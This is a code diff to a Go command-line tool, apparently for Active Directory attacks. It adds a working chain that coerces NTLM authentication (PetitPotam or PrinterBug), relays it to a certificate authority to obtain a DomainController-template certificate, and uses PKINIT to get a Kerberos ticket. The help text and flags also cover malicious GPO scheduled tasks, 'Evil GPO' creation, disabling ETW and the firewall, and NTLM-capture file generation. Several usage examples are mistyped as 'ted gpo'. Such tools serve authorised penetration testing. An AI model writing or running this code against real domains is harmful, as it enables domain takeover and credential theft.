@@ -2,14 +2,18 @@ package main
 
 import (
 	"context"
+	"crypto"
+	"crypto/x509"
 	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/loudmumble/trusted/pkg/gpo"
 	"github.com/loudmumble/trusted/pkg/pki"
+	"github.com/loudmumble/trusted/pkg/util"
 	"github.com/spf13/cobra"
 )
 
@@ -28,12 +32,12 @@ Attack paths:
   Extract TGTs via certificate-based authentication chains
 
 Examples:
-  trusted gpo --enum --target-dc dc01 --domain corp.local -u user -p pass
-  trusted gpo --acl --gpo "Vulnerable GPO" --target-dc dc01 --domain corp.local -u user -p pass
-  trusted gpo --exploit task --gpo "Vulnerable GPO" --task-name "Updater" --command cmd.exe --args "/c whoami"
-  trusted gpo --create --name "Evil GPO" --target-dc dc01 --domain corp.local -u user -p pass
-  trusted gpo --link --gpo "Evil GPO" --target "OU=Workstations,DC=corp,DC=local"
-  trusted gpo --coerce --method PetitPotam --target dc01 --listener-ip 10.0.0.5`,
+  trusted gpo --enum -d corp.local -dc dc01 -u user -p pass
+  ted gpo --acl --gpo "Vulnerable GPO"
+  ted gpo --exploit task --gpo "Vulnerable GPO" --task-name "Updater" --command cmd.exe
+  ted gpo --create --name "Evil GPO"
+  ted gpo --link --gpo "Evil GPO" --target "OU=Workstations,DC=corp,DC=local"
+  ted gpo --coerce --method PetitPotam --target dc01 -l 10.0.0.5`,
 	RunE: func(cmd *cobra.Command, args []string) error {
 		doEnum, _ := cmd.Flags().GetBool("enum")
 		doACL, _ := cmd.Flags().GetBool("acl")
@@ -41,7 +45,7 @@ Examples:
 		doCreate, _ := cmd.Flags().GetBool("create")
 		doLink, _ := cmd.Flags().GetBool("link")
 		doCoerce, _ := cmd.Flags().GetBool("coerce")
-		doGetTGT, _ := cmd.Flags().GetBool("get-tgt")
+		doGetTGT, _ := cmd.Flags().GetBool("tgt")
 		doGPP, _ := cmd.Flags().GetBool("gpp")
 		doSCF, _ := cmd.Flags().GetBool("scf")
 		doLNK, _ := cmd.Flags().GetBool("lnk")
@@ -458,11 +462,14 @@ func runGPOLink(cmd *cobra.Command) error {
 func runGPOCoerce(cmd *cobra.Command) error {
 	method, _ := cmd.Flags().GetString("method")
 	target, _ := cmd.Flags().GetString("target")
-	listenerIP, _ := cmd.Flags().GetString("listener-ip")
-	listenerPort, _ := cmd.Flags().GetInt("listener-port")
+	listenerIP, _ := cmd.Flags().GetString("lip")
+	listenerPort, _ := cmd.Flags().GetInt("lp")
+	if listenerPort == 0 {
+		listenerPort = 445
+	}
 
 	if target == "" || listenerIP == "" {
-		return fmt.Errorf("--target and --listener-ip are required")
+		return fmt.Errorf("--target and -l (listener IP) are required")
 	}
 
 	cfg := buildGPOConfig(cmd)
@@ -481,8 +488,130 @@ func runGPOCoerce(cmd *cobra.Command) error {
 }
 
 func runGPOGetTGT(cmd *cobra.Command) error {
-	fmt.Println("[*] CoerceToTGT chain: coerce → relay → cert → PKINIT → TGT")
-	fmt.Println("[*] Use --coerce with --esc 8 to chain coercion with certificate relay")
+	cfg := buildGPOConfig(cmd)
+	if err := pki.ValidateConnectionConfig(cfg); err != nil {
+		return err
+	}
+
+	target, _ := cmd.Flags().GetString("target")
+	listenerIP, _ := cmd.Flags().GetString("lip")
+	listenerPort, _ := cmd.Flags().GetInt("lp")
+	method, _ := cmd.Flags().GetString("method")
+	caHost, _ := cmd.Flags().GetString("ca-host")
+	caName, _ := cmd.Flags().GetString("ca-name")
+	template, _ := cmd.Flags().GetString("template")
+	upn, _ := cmd.Flags().GetString("upn")
+	outputDir, _ := cmd.Flags().GetString("output-dir")
+
+	if target == "" || listenerIP == "" {
+		return fmt.Errorf("--target and -l (listener IP) are required")
+	}
+	if upn == "" {
+		return fmt.Errorf("-U (UPN) is required for certificate enrollment (e.g. -U admin@%s)", cfg.Domain)
+	}
+	if !strings.Contains(upn, "@") {
+		return fmt.Errorf("-U must be a full UPN (user@domain), got %q", upn)
+	}
+	if listenerPort == 0 {
+		listenerPort = 80
+	}
+	if outputDir == "" {
+		outputDir = "."
+	}
+
+	if caHost == "" {
+		fmt.Println("[*] No --ca-host provided, auto-discovering via LDAP...")
+		ctx := context.Background()
+		conn, err := gpo.ConnectLDAP(ctx, cfg)
+		if err != nil {
+			return fmt.Errorf("LDAP connect for CA discovery: %w", err)
+		}
+		defer conn.Close()
+
+		services, err := pki.EnumerateEnrollmentServices(ctx, cfg, conn)
+		if err != nil {
+			return fmt.Errorf("enumerate enrollment services: %w", err)
+		}
+		if len(services) == 0 {
+			return fmt.Errorf("no enrollment services found — provide --ca-host and --ca-name manually")
+		}
+
+		caHost = services[0].DNSHostName
+		if caName == "" {
+			caName = services[0].Name
+		}
+		fmt.Printf("[+] Discovered CA: %s on %s\n", caName, caHost)
+	}
+	if caName == "" {
+		caName = caHost
+	}
+
+	if err := os.MkdirAll(outputDir, 0700); err != nil {
+		return fmt.Errorf("create output directory: %w", err)
+	}
+
+	coerceMethod := pki.CoercePetitPotam
+	if method == "PrinterBug" {
+		coerceMethod = pki.CoercePrinterBug
+	}
+
+	fmt.Printf("[*] CoerceToTGT chain: coerce(%s) → relay(:%d) → cert(%s/%s) → PKINIT → TGT\n",
+		method, listenerPort, caHost, template)
+
+	type relayResult struct {
+		cert *x509.Certificate
+		key  crypto.Signer
+		err  error
+	}
+	relayCh := make(chan relayResult, 1)
+
+	go func() {
+		cert, key, err := pki.RunRelayServer(caHost, template, upn, listenerPort, 120*time.Second)
+		relayCh <- relayResult{cert: cert, key: key, err: err}
+	}()
+
+	time.Sleep(500 * time.Millisecond)
+
+	fmt.Printf("[*] Triggering %s coercion: %s → %s:%d\n", method, target, listenerIP, listenerPort)
+	if err := pki.CoerceNTLMAuth(target, listenerIP, listenerPort, coerceMethod, cfg); err != nil {
+		fmt.Printf("[!] Coercion failed: %v\n", err)
+		fmt.Println("[*] Relay server still listening — waiting for incoming auth...")
+	}
+
+	result := <-relayCh
+	if result.err != nil {
+		return fmt.Errorf("relay failed: %w", result.err)
+	}
+	if result.cert == nil || result.key == nil {
+		return fmt.Errorf("relay produced nil certificate or key")
+	}
+
+	fmt.Printf("[+] Relay successful — obtained certificate for %s\n", upn)
+
+	certPath := filepath.Join(outputDir, strings.ReplaceAll(upn, "@", "_")+".pem")
+	if err := pki.WriteCertPEM(result.cert, certPath); err != nil {
+		return fmt.Errorf("write certificate: %w", err)
+	}
+	fmt.Printf("[+] Certificate saved: %s\n", certPath)
+
+	fmt.Println("[*] Running PKINIT authentication...")
+	pkinitResult, err := pki.PKINITAuth(&pki.PKINITConfig{
+		Cert:      result.cert,
+		Key:       result.key,
+		DC:        cfg.TargetDC,
+		Domain:    cfg.Domain,
+		UPN:       upn,
+		OutputDir: outputDir,
+	})
+	if err != nil {
+		fmt.Printf("[!] PKINIT failed: %v\n", err)
+		fmt.Println("[*] Certificate is still valid — use external PKINIT tool:")
+		fmt.Printf("    gettgtpkinit.py -pfx <pfx> %s/%s\n", cfg.Domain, upn)
+		return nil
+	}
+
+	fmt.Printf("[+] TGT obtained! ccache saved: %s\n", pkinitResult.CcachePath)
+	fmt.Printf("    export KRB5CCNAME=%s\n", pkinitResult.CcachePath)
 	return nil
 }
 
@@ -554,7 +683,7 @@ func runGPOGPP(cmd *cobra.Command) error {
 }
 
 func buildGPOConfig(cmd *cobra.Command) *pki.ADCSConfig {
-	targetDC, _ := cmd.Flags().GetString("target-dc")
+	targetDC, _ := cmd.Flags().GetString("dc")
 	domain, _ := cmd.Flags().GetString("domain")
 	username, _ := cmd.Flags().GetString("username")
 	password, _ := cmd.Flags().GetString("password")
@@ -586,12 +715,7 @@ func buildGPOConfig(cmd *cobra.Command) *pki.ADCSConfig {
 }
 
 func buildDomainDN(domain string) string {
-	parts := strings.Split(domain, ".")
-	var dcParts []string
-	for _, p := range parts {
-		dcParts = append(dcParts, "DC="+p)
-	}
-	return strings.Join(dcParts, ",")
+	return util.BuildDomainDN(domain)
 }
 
 func init() {
@@ -603,7 +727,7 @@ func init() {
 	gpoCmd.Flags().Bool("create", false, "Create a new GPO")
 	gpoCmd.Flags().Bool("link", false, "Link/unlink a GPO to a target")
 	gpoCmd.Flags().Bool("coerce", false, "Coerce NTLM authentication (PetitPotam, PrinterBug)")
-	gpoCmd.Flags().Bool("get-tgt", false, "CoerceToTGT chain: coerce → relay → cert → PKINIT")
+	gpoCmd.Flags().Bool("tgt", false, "CoerceToTGT chain: coerce → relay → cert → PKINIT")
 	gpoCmd.Flags().Bool("gpp", false, "Scan for GPP passwords in SYSVOL")
 
 	gpoCmd.Flags().String("gpo", "", "GPO name or GUID")
@@ -636,8 +760,8 @@ func init() {
 	gpoCmd.Flags().Bool("user-context", false, "Run in user context")
 
 	gpoCmd.Flags().String("method", "PetitPotam", "Coercion method: PetitPotam, PrinterBug")
-	gpoCmd.Flags().String("listener-ip", "", "Listener IP for coercion")
-	gpoCmd.Flags().Int("listener-port", 0, "Listener port for coercion")
+	gpoCmd.Flags().StringP("lip", "l", "", "Listener IP for coercion")
+	gpoCmd.Flags().IntP("lp", "", 0, "Listener port for coercion")
 
 	gpoCmd.Flags().Bool("scf", false, "Generate SCF file for NTLM capture")
 	gpoCmd.Flags().Bool("lnk", false, "Generate LNK file for NTLM capture")
@@ -657,26 +781,16 @@ func init() {
 	gpoCmd.Flags().Bool("disable-etw", false, "Disable ETW via GPO")
 	gpoCmd.Flags().Bool("disable-firewall", false, "Disable Windows Firewall via GPO")
 	gpoCmd.Flags().String("open-ports", "", "Comma-separated ports to open in firewall")
-	gpoCmd.Flags().String("output-dir", "", "Output directory for generated files")
 	gpoCmd.Flags().String("bh-output", "", "Output path for BloodHound JSON")
 	gpoCmd.Flags().String("bh-input", "", "Input path for BloodHound JSON")
 	gpoCmd.Flags().String("audit-output", "", "Output path for audit log")
 	gpoCmd.Flags().String("backup-dir", "", "Backup directory")
 
-	gpoCmd.Flags().String("target-dc", "", "Target domain controller")
-	gpoCmd.Flags().String("domain", "", "Active Directory domain")
-	gpoCmd.Flags().StringP("username", "u", "", "Domain username")
-	gpoCmd.Flags().StringP("password", "p", "", "Domain password")
-	gpoCmd.Flags().String("hash", "", "NTLM hash")
-	gpoCmd.Flags().BoolP("kerberos", "k", false, "Use Kerberos authentication")
-	gpoCmd.Flags().String("ccache", "", "Path to ccache file")
-	gpoCmd.Flags().String("keytab", "", "Path to keytab file")
-	gpoCmd.Flags().String("dc-ip", "", "KDC IP address")
-	gpoCmd.Flags().Bool("ldaps", false, "Use LDAPS")
-	gpoCmd.Flags().Bool("start-tls", false, "Use StartTLS")
-	gpoCmd.Flags().Bool("stealth", false, "Stealth mode")
-	gpoCmd.Flags().Int("timeout", 10, "Network timeout in seconds")
-	gpoCmd.Flags().Bool("json", false, "JSON output")
+	gpoCmd.Flags().StringP("output-dir", "o", "", "Output directory for generated files")
+	gpoCmd.Flags().StringP("upn", "U", "", "Target UPN for certificate (e.g. admin@corp.local)")
+	gpoCmd.Flags().String("ca-host", "", "CA hostname for NTLM relay (auto-discovered if omitted)")
+	gpoCmd.Flags().String("ca-name", "", "CA name for enrollment (auto-discovered if omitted)")
+	gpoCmd.Flags().String("template", "DomainController", "Certificate template for relay enrollment")
 }
 
 func runGPOSCF(cmd *cobra.Command) error {
